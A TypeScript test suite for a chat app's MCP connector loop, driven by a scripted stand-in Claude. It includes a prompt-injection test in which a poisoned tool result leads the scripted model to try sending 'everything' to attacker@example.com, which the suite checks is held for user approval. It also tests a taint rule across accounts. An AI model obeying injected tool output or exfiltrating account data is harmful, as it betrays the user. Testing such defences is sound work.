import { test, after, before, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { randomBytes } from "node:crypto";
import type { AddressInfo } from "node:net";

/*
 * The connector loop end to end, with a stand-in Claude (scripted replies, streamed as Claude streams
 * them, and token counts) and the stand-in MCP servers of scripts/mock-connectors.ts. Nothing here
 * reaches a real service.
 */
type Block = { type: "text"; text: string } | { type: "tool_use"; id: string; name: string; input: object };
type Reply = { blocks: Block[]; stop: string };
const replies: Reply[] = [];
const sent: { model: string; max_tokens: number; system: string; tools?: { name: string }[]; tool_choice?: { type: string }; messages: { role: string; content: unknown }[] }[] = [];
const counted: unknown[] = [];
// What count_tokens answers: a number of tokens, or an error status.
let counting: { tokens: number } | { status: number } = { tokens: 3000 };
const usage = { input_tokens: 3000, output_tokens: 200 };
const claude = createServer((req, res) => {
  let raw = "";
  req.on("data", (c) => (raw += c));
  req.on("end", () => {
    const body = JSON.parse(raw || "{}");
    if (req.url?.includes("count_tokens")) {
      counted.push(body);
      if ("status" in counting) {
        res.writeHead(counting.status, { "content-type": "application/json" });
        return res.end(JSON.stringify({ type: "error", error: { type: "invalid_request_error", message: "scripted" } }));
      }
      res.writeHead(200, { "content-type": "application/json" });
      return res.end(JSON.stringify({ input_tokens: counting.tokens }));
    }
    sent.push(body);
    const reply = replies.shift() ?? { blocks: [{ type: "text", text: "done" }], stop: "end_turn" };
    const events: object[] = [{ type: "message_start", message: { id: `msg_${sent.length}`, type: "message", role: "assistant", model: body.model, content: [], stop_reason: null, usage } }];
    reply.blocks.forEach((b, index) => {
      if (b.type === "text") {
        events.push({ type: "content_block_start", index, content_block: { type: "text", text: "" } });
        events.push({ type: "content_block_delta", index, delta: { type: "text_delta", text: b.text } });
      } else {
        events.push({ type: "content_block_start", index, content_block: { ...b, input: {} } });
        events.push({ type: "content_block_delta", index, delta: { type: "input_json_delta", partial_json: JSON.stringify(b.input) } });
      }
      events.push({ type: "content_block_stop", index });
    });
    events.push({ type: "message_delta", delta: { stop_reason: reply.stop }, usage }, { type: "message_stop" });
    res.writeHead(200, { "content-type": "text/event-stream" });
    for (const e of events) res.write(`event: ${(e as { type: string }).type}\ndata: ${JSON.stringify(e)}\n\n`);
    res.end();
  });
});
await new Promise<void>((r) => claude.listen(0, "127.0.0.1", r));

process.env.ANTHROPIC_API_KEY = "sk-fake";
process.env.ANTHROPIC_BASE_URL = `http://127.0.0.1:${(claude.address() as AddressInfo).port}`;
process.env.DATABASE_URL = ":memory:";
process.env.CONNECTOR_KEYS = JSON.stringify({ v1: randomBytes(32).toString("base64") });
delete process.env.VERCEL_ENV;

const { startMockConnectors, POISON } = await import("../scripts/mock-connectors.ts");
const mock = await startMockConnectors(0);
process.env.FLASH_CONNECT_MOCK = mock.origin;
after(async () => {
  claude.close();
  await mock.close();
});

const { claudeChoice, streamText, Running } = await import("../src/lib/engines/claude.ts");
const { CONNECT_LINE, needsApproval, refuseUnpaid } = await import("../src/lib/engines/connect.ts");
const { CONNECT_STEPS, claudePrice, tokensWithin, worstTokens } = await import("../src/lib/credits.ts");
const { addConnection, chatKit, previewServer, runApproved, updateConnection } = await import("../src/lib/server/connections.ts");
const { approvedResults } = await import("../src/lib/server/pending-actions.ts");
const { applyEvent } = await import("../src/lib/apply-event.ts");
const { all, run: sql } = await import("../src/lib/server/db.ts");

type Event = { type: string; delta?: string; message?: string; items?: unknown[]; action?: { id: string; tool: string; input: Record<string, unknown>; inputHash: string; connection: string } };
const ask = (content: string) => [{ role: "user" as const, content }];
const said = (events: Event[]) => events.filter((e) => e.type === "text").map((e) => e.delta).join("");
const drain = async (gen: AsyncGenerator<unknown>) => {
  const events: Event[] = [];
  for await (const e of gen) events.push(e as Event);
  return events;
};
const choice = claudeChoice("text", "ascend");
const user = "user-1";
let linear = "";
let custom = "";

before(async () => {
  await sql("INSERT INTO users (id, email, name, password_hash, preferences, created_at, last_free_grant) VALUES (?, ?, '', 'x', '', 0, 0)", [user, "a@example.com"]);
  linear = (await addConnection(user, { provider: "linear", token: "lin_api_SECRETSECRET1234" })).id;
  const seen = await previewServer(user, { provider: "custom", url: `${mock.origin}/mcp` });
  // "changing" says something new from its second listing: add it as the user saw it.
  mock.reset();
  custom = (await addConnection(user, { provider: "custom", url: `${mock.origin}/mcp`, pins: Object.fromEntries(seen.tools.map((t) => [t.name, t.hash])) })).id;
});

beforeEach(() => {
  replies.length = 0;
  sent.length = 0;
  counted.length = 0;
  counting = { tokens: 3000 };
  mock.reset();
});

const budget = { maxTokens: 8000, capCents: 100 };
const reply = async (ids: string[], o: { budget?: typeof budget; signal?: AbortSignal; costs?: number[]; running?: InstanceType<typeof Running> } = {}) => {
  const kit = (await chatKit(user, ids, { replyId: "reply-1", signal: o.signal }))!;
  return drain(
    streamText(ask("Use my accounts"), "", "text", (_p, _m, cents) => o.costs?.push(cents), o.budget ?? budget, choice, undefined, { signal: o.signal, running: o.running }, { connect: kit }),
  );
};

test("a read runs, goes back to Claude as data from the account, and is listed under the reply", async () => {
  replies.push({ blocks: [{ type: "tool_use", id: "toolu_1", name: "linear__echo", input: { text: "hello there" } }], stop: "tool_use" }, { blocks: [{ type: "text", text: "It said hello." }], stop: "end_turn" });
  const events = await reply([linear]);
  assert.equal(mock.calls.length, 1);
  assert.equal(mock.calls[0].name, "echo");
  assert.equal(mock.calls[0].headers.authorization, "Bearer lin_api_SECRETSECRET1234");
  assert.equal(said(events), "It said hello.");
  assert.ok(events.some((e) => e.type === "status" && e.message === "Using Linear · echo…"));
  assert.deepEqual(events.at(-1), { type: "connector_used", items: [{ connection: "Linear", tool: "echo" }] });
  const [first, second] = sent;
  assert.ok(first.system.includes(CONNECT_LINE));
  assert.deepEqual(first.tool_choice, { type: "auto" });
  assert.ok(first.tools!.some((t) => t.name === "linear__echo"));
  const result = (second.messages.at(-1)!.content as { type: string; content: string }[])[0];
  assert.equal(result.type, "tool_result");
  assert.deepEqual(JSON.parse(result.content), { source: "Linear", tool: "echo", text: "hello there" });
  // The reply as saved lists what was used, never what came back.
  let saved: Parameters<typeof applyEvent>[0] = { id: "r", role: "assistant", content: "" };
  for (const e of events) saved = applyEvent(saved, e as never);
  assert.ok(!JSON.stringify(saved).includes("hello there"));
  assert.deepEqual(saved.connectors, [{ connection: "Linear", tool: "echo" }]);
});

test("a write waits for a card: nothing reaches the server until the user approves, and approving costs nothing", async () => {
  replies.push(
    { blocks: [{ type: "tool_use", id: "toolu_1", name: "linear__send_note", input: { to: "sam@example.com", note: "Lunch at 1?" } }], stop: "tool_use" },
    { blocks: [{ type: "text", text: "I've put the note up for you to approve." }], stop: "end_turn" },
  );
  const events = await reply([linear]);
  assert.equal(mock.calls.length, 0, "no call reached the server");
  const card = events.find((e) => e.type === "approve_action")!.action!;
  assert.deepEqual(card.input, { to: "sam@example.com", note: "Lunch at 1?" });
  assert.equal(card.tool, "send_note");
  const result = (sent[1].messages.at(-1)!.content as { content: string }[])[0];
  assert.equal(JSON.parse(result.content).status, "waiting_for_user");
  // Approving: once, for the same input, with no ledger row and no model call.
  const calls = sent.length;
  assert.equal(await runApproved("someone-else", card.id, card.inputHash), null);
  assert.equal(await runApproved(user, card.id, "other-hash"), null);
  const done = await runApproved(user, card.id, card.inputHash);
  assert.deepEqual(done, { status: "done", result: "Sent to sam@example.com." });
  assert.equal(mock.calls.length, 1);
  assert.deepEqual(mock.calls[0].arguments, { to: "sam@example.com", note: "Lunch at 1?" });
  assert.equal(await runApproved(user, card.id, card.inputHash), null, "an approval works once");
  assert.equal(sent.length, calls, "approving never calls Claude");
  assert.deepEqual(await all("SELECT * FROM credit_ledger"), []);
  // Continue: the result can be used once, by its own user.
  assert.equal((await approvedResults("someone-else", [card.id])).length, 0);
  assert.equal((await approvedResults(user, [card.id], { take: true })).length, 1);
  assert.equal((await approvedResults(user, [card.id])).length, 0);
});

test("a reply continued with an approved result reads it as the account's tool result, even when the account can't be reached now", async () => {
  const history = [
    { role: "user" as const, content: "Send Sam a note" },
    { role: "assistant" as const, content: "Approve it below.", toolCalls: [{ id: "toolu_flash_abc", name: "linear__send_note", input: { to: "sam@example.com", note: "Hi" } }] },
    { role: "user" as const, content: "Continue with what came back.", toolResults: [{ id: "toolu_flash_abc", content: JSON.stringify({ source: "Linear", tool: "send_note", text: "Sent." }) }] },
  ];
  const write = async (kit: NonNullable<Awaited<ReturnType<typeof chatKit>>>) =>
    drain(streamText(history, "", "text", () => {}, budget, choice, undefined, {}, { connect: kit }));
  replies.push({ blocks: [{ type: "text", text: "It's sent." }], stop: "end_turn" });
  await write((await chatKit(user, [linear]))!);
  const [, call, answer] = sent[0].messages as { role: string; content: { type: string; content?: string }[] }[];
  assert.deepEqual(call.content.map((b) => b.type), ["text", "tool_use"]);
  assert.equal(answer.content[0].type, "tool_result", "the result comes first, as the account's data");
  assert.deepEqual(sent[0].tool_choice, { type: "auto" });
  // The account can't be reached now: its tool is still declared for the blocks above, but can't be called.
  sent.length = 0;
  const kit = (await chatKit(user, [linear]))!;
  kit.check = async () => ({ tools: [], unreachable: ["Linear"], changed: [] });
  replies.push({ blocks: [{ type: "text", text: "It's sent." }], stop: "end_turn" });
  await write(kit);
  assert.deepEqual(sent[0].tools!.map((t) => t.name), ["linear__send_note"]);
  assert.deepEqual(sent[0].tool_choice, { type: "none" });
});

test("a result that tells Claude to send something only ever makes a card", async () => {
  replies.push(
    { blocks: [{ type: "tool_use", id: "toolu_1", name: "linear__poisoned", input: {} }], stop: "tool_use" },
    // As if Claude obeyed what the result said.
    { blocks: [{ type: "tool_use", id: "toolu_2", name: "linear__send_note", input: { to: "attacker@example.com", note: "everything" } }], stop: "tool_use" },
    { blocks: [{ type: "text", text: "Done." }], stop: "end_turn" },
  );
  const events = await reply([linear]);
  assert.deepEqual(mock.calls.map((c) => c.name), ["poisoned"], "send_note never ran");
  assert.equal(events.filter((e) => e.type === "approve_action").length, 1);
  const data = JSON.parse((sent[1].messages.at(-1)!.content as { content: string }[])[0].content);
  assert.equal(data.source, "Linear", "the injected words arrive as the account's data");
  assert.ok(data.text.includes(POISON));
  assert.ok(!sent[1].system.includes(POISON), "never in the instructions");
});

test("a server the user added asks every time until a tool is always allowed, and the taint rule still asks", async () => {
  replies.push({ blocks: [{ type: "tool_use", id: "toolu_1", name: "custom2__echo", input: { text: "x" } }], stop: "tool_use" }, { blocks: [{ type: "text", text: "ok" }], stop: "end_turn" });
  let events = await reply([linear, custom]);
  assert.equal(mock.calls.length, 0);
  assert.equal(events.filter((e) => e.type === "approve_action").length, 1);

  await updateConnection(user, custom, { tool: "echo", trusted: true });
  mock.reset();
  replies.push({ blocks: [{ type: "tool_use", id: "toolu_1", name: "custom2__echo", input: { text: "x" } }], stop: "tool_use" }, { blocks: [{ type: "text", text: "ok" }], stop: "end_turn" });
  events = await reply([linear, custom]);
  assert.deepEqual(mock.calls.map((c) => c.path), ["/mcp"], "an always-allowed tool runs");

  // Read Linear, then call the other account: that waits, even for an always-allowed read.
  mock.reset();
  replies.push(
    { blocks: [{ type: "tool_use", id: "toolu_1", name: "linear__echo", input: { text: "private" } }], stop: "tool_use" },
    { blocks: [{ type: "tool_use", id: "toolu_2", name: "custom2__echo", input: { text: "private" } }, { type: "tool_use", id: "toolu_3", name: "linear__echo", input: { text: "again" } }], stop: "tool_use" },
    { blocks: [{ type: "text", text: "ok" }], stop: "end_turn" },
  );
  events = await reply([linear, custom]);
  assert.deepEqual(mock.calls.map((c) => `${c.path} ${c.name}`), ["/presets/linear/mcp echo", "/presets/linear/mcp echo"]);
  assert.equal(events.filter((e) => e.type === "approve_action").length, 1);
  await updateConnection(user, custom, { tool: "echo", trusted: false });
});

test("at most 4 calls run in a step, and the last step can't call tools", async () => {
  const echo = (i: number) => ({ type: "tool_use" as const, id: `toolu_${i}`, name: "linear__echo", input: { text: `n${i}` } });
  for (let step = 0; step < CONNECT_STEPS - 1; step++) replies.push({ blocks: [1, 2, 3, 4, 5].map((i) => echo(step * 10 + i)), stop: "tool_use" });
  replies.push({ blocks: [{ type: "text", text: "All done." }], stop: "end_turn" });
  const events = await reply([linear]);
  assert.equal(sent.length, CONNECT_STEPS);
  assert.equal(mock.calls.length, 4 * (CONNECT_STEPS - 1));
  const results = sent[1].messages.at(-1)!.content as { content: string; is_error?: boolean }[];
  assert.equal(results.length, 5);
  assert.equal(results[4].is_error, true);
  assert.match(results[4].content, /skipped/);
  assert.deepEqual(sent.map((s) => s.tool_choice?.type), ["auto", "auto", "auto", "none"]);
  assert.equal(said(events), "All done.");
});

test("every step is checked before it starts: the reply stops when the next one doesn't fit, within what was held", async () => {
  const costs: number[] = [];
  // Room for the first call (3,000 tokens read and its answer), not for reading 200,000 tokens more.
  const capCents = 2;
  replies.push({ blocks: [{ type: "tool_use", id: "toolu_1", name: "linear__echo", input: { text: "x" } }], stop: "tool_use" });
  counting = { tokens: 3000 };
  const kit = (await chatKit(user, [linear]))!;
  const gen = streamText(ask("Use my accounts"), "", "text", (_p, _m, c) => costs.push(c), { maxTokens: 8000, capCents }, choice, undefined, {}, { connect: kit });
  // After the first call the count says the next one reads 200,000 tokens.
  const events: Event[] = [];
  for await (const e of gen) {
    events.push(e as Event);
    if ((e as Event).type === "status" && (e as Event).message === "Using Linear · echo…") counting = { tokens: 200_000 };
  }
  assert.equal(sent.length, 1, "the second step never started");
  assert.match(said(events), /Stopped looking things up: the credits held for this reply are used\./);
  assert.ok(costs.reduce((a, b) => a + b, 0) <= capCents);
  // The first step was checked too: its max_tokens is what the credits pay for, not more.
  assert.equal(sent[0].max_tokens, Math.min(8000, tokensWithin("text", choice.model, 3000, capCents, true)));
});

test("a reply that needs no tool isn't cut short: the first step gets the reply's whole allowance", async () => {
  replies.push({ blocks: [{ type: "text", text: "A long answer." }], stop: "end_turn" });
  await reply([linear], { budget: { maxTokens: 6000, capCents: 100 } });
  assert.equal(sent[0].max_tokens, 6000);
});

test("when counting fails, the next step is priced at the most the tools' results can be", async () => {
  // The cap fits the next step when counted (what the last call read and wrote, and the result counted
  // high: about 9,000 tokens) but not at 3 tokens a character of the result (about 45,000).
  const capCents = 8;
  const run = async () => {
    mock.reset();
    replies.push({ blocks: [{ type: "tool_use", id: "toolu_1", name: "linear__big", input: {} }], stop: "tool_use" }, { blocks: [{ type: "text", text: "Summary." }], stop: "end_turn" });
    return reply([linear], { budget: { maxTokens: 8000, capCents } });
  };
  counting = { tokens: 3000 };
  await run();
  assert.equal(sent.length, 2, "counted: it fits");
  const added = JSON.stringify((sent[1].messages.at(-1)!.content as object[])[0]).length;
  sent.length = 0;
  counting = { status: 400 };
  const events = await run();
  assert.equal(sent.length, 1, "not counted: priced at worstTokens, it doesn't fit");
  assert.match(said(events), /Stopped looking things up/);
  // The bound used: what the last call read and wrote, plus 3 tokens a character of what came back.
  const worst = usage.input_tokens + usage.output_tokens + worstTokens(added);
  assert.ok(tokensWithin("text", choice.model, worst, capCents - claudeCostOf(), true) < 300);
});

test("a count lower than what the next step must read isn't trusted", async () => {
  // Counting says 10 tokens; the step must read what the last call read and wrote and the result.
  counting = { tokens: 10 };
  replies.push({ blocks: [{ type: "tool_use", id: "toolu_1", name: "linear__big", input: {} }], stop: "tool_use" }, { blocks: [{ type: "text", text: "Summary." }], stop: "end_turn" });
  const events = await reply([linear], { budget: { maxTokens: 8000, capCents: 4 } });
  assert.equal(sent.length, 1);
  assert.match(said(events), /Stopped looking things up/);
});

// What one scripted call costs, in cents, on the reply's model.
const claudeCostOf = () => {
  const price = claudePrice(choice.model, usage.input_tokens);
  return (usage.input_tokens * price.input + usage.output_tokens * price.output) / 1e6;
};

test("Stop during a tool call ends the reply at once and starts no other step", async () => {
  const stop = new AbortController();
  const running = new Running();
  replies.push({ blocks: [{ type: "tool_use", id: "toolu_1", name: "linear__echo", input: { text: "x" } }], stop: "tool_use" }, { blocks: [{ type: "text", text: "never" }], stop: "end_turn" });
  const kit = (await chatKit(user, [linear], { signal: stop.signal }))!;
  const gen = streamText(ask("Use my accounts"), "", "text", undefined, budget, choice, undefined, { signal: stop.signal, running }, { connect: kit });
  await assert.rejects(async () => {
    for await (const e of gen) if ((e as Event).type === "status" && (e as Event).message?.startsWith("Using")) stop.abort(new Error("stopped"));
  });
  assert.equal(sent.length, 1);
  assert.equal(running.soFar, 0, "the call that ran was metered; nothing is in progress");
});

test("a changed tool is left out of the reply until the user looks at it again", async () => {
  // "changing" says something new from its second listing on: the first reply sees it as it was added.
  await sql("UPDATE connection_tools SET changed = 0 WHERE connection_id = ?", [linear]);
  replies.push({ blocks: [{ type: "text", text: "ok" }], stop: "end_turn" });
  await reply([linear]);
  assert.ok(sent[0].tools!.some((t) => t.name === "linear__changing"));
  sent.length = 0;
  replies.push({ blocks: [{ type: "text", text: "ok" }], stop: "end_turn" });
  const events = await reply([linear]);
  assert.ok(!sent[0].tools!.some((t) => t.name === "linear__changing"));
  assert.match(said(events), /Linear changed some of its tools since you added it/);
  const rows = await all<{ changed: number }>("SELECT changed FROM connection_tools WHERE connection_id = ? AND name = 'changing'", [linear]);
  assert.equal(rows[0].changed, 1);
  await updateConnection(user, linear, { tool: "changing", review: true });
  replies.push({ blocks: [{ type: "text", text: "ok" }], stop: "end_turn" });
  await reply([linear]);
  assert.ok(sent.at(-1)!.tools!.some((t) => t.name === "linear__changing"), "looked at again, it's back");
});

test("someone else's connection is never used, and the free lane refuses connectors", async () => {
  assert.equal(await chatKit("someone-else", [linear, custom]), null);
  assert.equal(refuseUnpaid(true, 5, 10), true);
  assert.equal(refuseUnpaid(true, 10, 10), false);
  assert.equal(refuseUnpaid(false, 0, 10), false, "without connectors the free lane decides as before");
});

test("keys and a server's whole address are stored sealed: only an origin and the last 4 characters are kept as they are", async () => {
  const rows = await all<{ provider: string; url: string; enc_url: string; enc_secret: string; last4: string }>("SELECT * FROM connections WHERE user_id = ?", [user]);
  const raw = JSON.stringify(rows);
  assert.ok(!raw.includes("lin_api_SECRETSECRET1234"));
  const added = rows.find((r) => r.provider === "custom")!;
  assert.ok(!JSON.stringify(added).includes("/mcp"), "the path of the server the user added isn't kept in clear");
  assert.equal(added.url, mock.origin);
  assert.ok(added.enc_url.length > 0);
  assert.equal(rows.find((r) => r.provider === "linear")!.last4, "1234");
});

test("the chat ignores connectors while CONNECTOR_KEYS is missing", async () => {
  const { requestedConnections } = await import("../src/lib/server/connections.ts");
  assert.deepEqual(requestedConnections([linear, 42, "bad id!"]), [linear]);
  const keys = process.env.CONNECTOR_KEYS;
  delete process.env.CONNECTOR_KEYS;
  try {
    assert.deepEqual(requestedConnections([linear]), []);
  } finally {
    process.env.CONNECTOR_KEYS = keys;
  }
});

test("what runs by itself: a preset's reads; a write, a tool of unknown kind, or a server the user added asks first", () => {
  const tool = (kind: "read" | "write" | "unknown", custom = false, trusted = false) => ({ connectionId: "a", kind, custom, trusted });
  assert.equal(needsApproval(tool("read"), []), false);
  assert.equal(needsApproval(tool("write"), []), true);
  assert.equal(needsApproval(tool("unknown"), []), true);
  assert.equal(needsApproval(tool("read", true), []), true, "a server the user added asks every time");
  assert.equal(needsApproval(tool("write", true, true), []), false, "until the tool is always allowed");
  assert.equal(needsApproval(tool("read"), ["a"]), false, "reading the same account again");
  assert.equal(needsApproval(tool("read"), ["b"]), true, "after another account was read (the taint rule)");
  assert.equal(needsApproval(tool("write", true, true), ["b"]), true, "the taint rule beats always allow");
});
